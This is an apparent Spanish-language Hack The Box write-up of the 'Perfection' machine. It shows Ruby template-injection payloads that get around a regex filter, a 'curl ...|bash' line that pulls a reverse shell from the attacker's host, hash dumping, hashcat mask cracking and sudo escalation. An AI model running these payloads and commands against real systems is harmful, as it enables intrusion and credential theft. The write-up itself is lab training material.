---
tags:
title: Perfection - Easy (HTB)
permalink: /Perfection-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
zs1n$ nmap -sCV -p22,80 10.129.229.121 -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-26 19:52 -0500
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.75% done; ETC: 19:53 (0:00:00 remaining)
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.75% done; ETC: 19:53 (0:00:00 remaining)
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.75% done; ETC: 19:53 (0:00:00 remaining)
Nmap scan report for 10.129.229.121
Host is up (0.64s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.01 seconds
```
## Website

La pagina hostea una calculadora de grados, en base al promedio de materias, o demas cosas.

![image-center](/assets/images/Pasted image 20260226215311.png)
### SSTI
Ingresando cualquier numero y algo en la sección de `Category`.
 
![image-center](/assets/images/Pasted image 20260226215530.png)
## Shell as susan
### Output
Veo como en el output de ven los porcentajes.

![image-center](/assets/images/Pasted image 20260226230331.png)
### RCE Ruby SSTI 

Viendo la petición luego de interceptarla con `Burpsuite`, coloque un simple payload para SSTI `(Server side template injection)`, viendo en la salida un mensaje que indica la detección del input malicioso.

![image-center](/assets/images/Pasted image 20260226230414.png)
### Bypass regex

Usando la guía de `PayloadAllTheThings`, en [este repositorio](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md), encontré algunos payloads como: 

```bash
<%= IO.popen('ls /').readlines()  %>

<%= `ls /` %>
```

En mi caso vi que poniendo algo y luego un salto de linea, caracteres como `#, <>, {}` no los detecta debido al salto de linea `(\n)`.

![image-center](/assets/images/Pasted image 20260226231114.png)
### Shell

Por lo que probé lo siguiente.

```bash
TEST
<%= `ls` %>
```

Viendo así el output de los archivos y directorios actuales.

![image-center](/assets/images/Pasted image 20260226231151.png)

También el output del comando `id`.

![image-center](/assets/images/Pasted image 20260226231227.png)

Por lo que genere una reverse shell en un `index.html`.

```bash
zs1n$ gen_lin_rev 10.10.17.19 4444
[+] Wrote Linux reverse shells to /home/zsln/Desktop/zsln/Perfection/index.html
```

luego con `curl` envié la petición a mi `ip` de la siguiente manera.

```bash
TEST
<%= `curl 10.10.17.19|bash` %>
```

Viendo así como llega la petición desde el servidor.

```
```bash
zs1n$ gen_lin_rev 10.10.17.19 4444
[+] Wrote Linux reverse shells to /home/zsln/Desktop/zsln/Perfection/index.html

zs1n$ www
[eth0] 192.168.100.8
[docker0] 172.17.0.1
[br-427beff723d7] 172.18.0.1
[tun0] 10.10.17.19
[/home/zsln/Desktop/zsln/Perfection]
allPorts  index.html  port_scan
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.229.121 - - [26/Feb/2026 21:13:17] "GET / HTTP/1.1" 200 -
```

Y también la shell como el usuario `susan`.

```bash
zs1n$ sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.121] 49502
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
$
```

```bash
susan@perfection:~$ cat user.txt
01e34...
```
### Shell as root
### sqlite3 db

Viendo en el directorio `Migration` de este usuario, contaba con un archivo de base de datos de `sqlite3`.

```bash
susan@perfection:~$ ls -la Migration
total 16
drwxr-xr-x 2 root  root  4096 Oct 27  2023 .
drwxr-x--- 7 susan susan 4096 Feb 26  2024 ..
-rw-r--r-- 1 root  root  8192 May 14  2023 pupilpath_credentials.db
```

Lo ejecute con `sqlite3 pupilpath_credentials.db` y luego obtuve todos los datos de la tabla `users`.

```bash
sqlite> select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```
### Mail

El hash es incrackeable hasta el momento, sin embargo este usuario contaba con un `mail`, relatando el patrón que tienen ahora las contraseñas de los usuarios.

```bash
susan@perfection:/var/mail$ cat susan
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```
### Mask hashcat attack

Siendo las sintaxis así:

```bash
<nombre>_<nombre-alreves>_<numero-entre-1-1000000000>
```

Por lo que cree una `wordlist`, con el prefijo.

```bash
zs1n$ Perfection echo 'susan_nasus_' > susan 
```

Luego coloque el hash de `susan` en un archivo.

```bash
zs1n$ cat hash
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
```
### Crack password

Y luego use `hashcat` para crear una regla en la cual itera en los últimos `9` dígitos por un patrón de números determinados.

```bash
zs1n$ hashcat -m 1400 hash susan -a 6 ?d?d?d?d?d?d?d?d?d -O --show
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```
### Shell

Con dicha password, me volví a conectar como `susan` por ssh.

```bash
zs1n$ ssh susan@perfection.htb
The authenticity of host 'perfection.htb (10.129.229.121)' can't be established.
ED25519 key fingerprint is: SHA256:Wtv7NKgGLpeIk/fWBeL2EmYo61eHT7hcltaFwt3YGrI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'perfection.htb' (ED25519) to the list of known hosts.
susan@perfection.htb's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Fri Feb 27 04:45:56 AM UTC 2026

  System load:           0.0
  Usage of /:            68.3% of 5.80GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.129.229.121
  IPv6 address for eth0: dead:beef::250:56ff:fe95:60eb

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
susan@perfection:~$ id
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
```
### Weak group membership

Viendo el output del comando `id`, vi que este usuario esta en el grupo `sudo` para ejecutar cualquier comando, asi que solo me quedo usar el mismo privilegio para convertirme en `root`.

```
susan@perfection:~/ruby_app/public$ sudo -i
root@perfection:~# cat /root/root.txt
17cea...
```

`~Happy Hacking.`





`~Happy Hacking.`